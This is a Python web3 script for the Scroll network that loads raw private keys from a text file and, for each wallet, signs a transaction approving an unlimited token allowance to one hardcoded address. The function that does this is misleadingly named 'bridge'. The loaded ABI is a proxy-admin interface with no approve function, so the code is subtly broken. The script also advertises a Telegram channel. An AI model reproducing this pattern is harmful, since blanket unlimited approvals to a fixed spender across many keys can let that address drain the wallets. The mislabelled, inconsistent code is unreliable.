from web3 import Web3, Account
import json
from datetime import datetime, timedelta
import requests
import re


rpc_eth = 'https://scroll.blockpi.network/v1/rpc/public'
w3 = Web3(Web3.HTTPProvider(rpc_eth))
# https://t.me/mallinmakin
# https://t.me/mallinmakin
# https://t.me/mallinmakin
ERC20_ABI = json.loads('''[{"inputs":[{"internalType":"address","name":"implementationContract","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"previousAdmin","type":"address"},{"indexed":false,"internalType":"address","name":"newAdmin","type":"address"}],"name":"AdminChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"implementation","type":"address"}],"name":"Upgraded","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"admin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newAdmin","type":"address"}],"name":"changeAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"implementation","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newImplementation","type":"address"}],"name":"upgradeTo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newImplementation","type":"address"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"upgradeToAndCall","outputs":[],"stateMutability":"payable","type":"function"}]''')

eth_contract_address = Web3.to_checksum_address('0x80e38291e06339d10aab483c65695d004dbd5c69')
eth_contract = w3.eth.contract(eth_contract_address, abi=ERC20_ABI)


def bridge(account):
    address = account.address
    nonce = w3.eth.get_transaction_count(address)
    current_time = datetime.now()
    new_time = current_time + timedelta(minutes=20)
    uint256_time = int(new_time.timestamp())
    transaction = eth_contract.functions.approve('0x20E77aD760eC9E922Fd2dA8847ABFbB2471B92CD', 	115792089237316195423570985008687907853269984665640564039457584007913129639935).build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 100000,
        'gasPrice': w3.eth.gas_price,
        'from': address,
        'nonce': nonce,
        'value': 0

    })
    signed_txn = w3.eth.account.sign_transaction(transaction, private_key=account.key)
    txn = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    return txn


txt = 'privates.txt'
with open(txt, 'r', encoding='utf-8') as keys_file:
    accounts = [Account.from_key(line.replace("\n", "")) for line in keys_file.readlines()]
    for account in accounts:
        txn = bridge(account)
        print(f'https://scrollscan.com//tx/{txn.hex()}')
